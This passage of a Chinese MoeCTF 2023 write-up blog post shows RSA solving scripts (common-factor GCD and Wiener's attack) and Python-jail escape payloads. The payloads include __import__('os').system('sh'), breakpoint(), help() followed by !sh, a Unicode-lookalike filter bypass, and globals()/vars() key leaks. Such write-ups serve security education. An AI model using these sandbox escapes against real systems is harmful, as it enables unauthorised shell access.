class="hljs-number">6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>e=<span class="hljs-number">65537</span><br>names = <span class="hljs-built_in">locals</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):<br>      <span class="hljs-keyword">if</span> GCD(names[<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(i)],names[<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(k)])!=<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(i,k)<br>p = GCD(n3,n11)<br>q =  n3//p      <br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m=<span class="hljs-built_in">pow</span>(c3,d,n3)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br>        <br></code></pre></td></tr></table></figure>

<h3 id="giant-e"><a href="#giant-e" class="headerlink" title="giant_e"></a>giant_e</h3><p>维纳攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continuedFra</span>(<span class="hljs-params">x, y</span>):<br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradualFra</span>(<span class="hljs-params">cf</span>):<br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pq</span>(<span class="hljs-params">a, b, c</span>):<br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getGradualFra</span>(<span class="hljs-params">cf</span>):<br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br>n = <span class="hljs-number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span><br>e = <span class="hljs-number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span><br>c = <span class="hljs-number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span><br>d = wienerAttack(e, n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure>

<h1 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h1><h3 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h3><p>没有过滤<br><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>拿到shell<br><img src="/mdimg/moectf2023/53.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Jail-Level-1"><a href="#Jail-Level-1" class="headerlink" title="Jail Level 1"></a>Jail Level 1</h3><p>限制payload 长度12<br><code> breakpoint()</code><br><img src="/mdimg/moectf2023/54.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Jail-Level-2"><a href="#Jail-Level-2" class="headerlink" title="Jail Level 2"></a>Jail Level 2</h3><p>长度 6  <code>help()</code><br>随便输入一个模块 比如 os 然后 !sh 拿到shell<br><img src="/mdimg/moectf2023/55.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/56.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Jail-Level-3"><a href="#Jail-Level-3" class="headerlink" title="Jail Level 3"></a>Jail Level 3</h3><p><img src="/mdimg/moectf2023/57.png" srcset="/img/loading.gif" lazyload><br><code>ｂreakpoint()</code>用特殊符号b绕过<br>需要在linux nc</p>
<h3 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h3><p>py2 <code> eval(input(&#39;&gt;&gt;&gt;&gt;&gt;&#39;))</code><br><img src="/mdimg/moectf2023/58.png" srcset="/img/loading.gif" lazyload><br>看看源码<br><img src="/mdimg/moectf2023/59.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Leak-Level-0"><a href="#Leak-Level-0" class="headerlink" title="Leak Level 0"></a>Leak Level 0</h3><p><img src="/mdimg/moectf2023/60.png" srcset="/img/loading.gif" lazyload><br>拿key进后门<br><code> globals()</code><br><img src="/mdimg/moectf2023/61.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Leak-Level-1"><a href="#Leak-Level-1" class="headerlink" title="Leak Level 1"></a>Leak Level 1</h3><p><img src="/mdimg/moectf2023/62.png" srcset="/img/loading.gif" lazyload><br>长度6<br><code>vars()</code><br><img src="/mdimg/moectf2023/63.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Leak-Level-2"><a href="#Leak-Level-2" class="headerlink" title="Leak Level 2"></a>Leak Level 2</h3><p>help() –》 <code>__mian__</code>拿到key<br><img src="/mdimg/moectf2023/64.png" srcset="/img/loading.gif" lazyload></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  
    <span>></span>
    
  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Write-Up/">#Write Up</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>moectf2023 wp</div>
      <div>http://example.com/2023/10/16/moectf2023/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>J_0k3r</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年10月16日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              BY J_0K3R 
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/11/29/ISCTF%202023/" title="ISCTF 2023 wp">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ISCTF 2023 wp</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/10/16/NewStarCTF%202023%20week2/" title="NewStarCTF 2023 week2 wp">
                        <span class="hidden-mobile">NewStarCTF 2023 week2 wp</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       J_0k3r <i class="iconfont icon-love"></i> Hor1zon 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
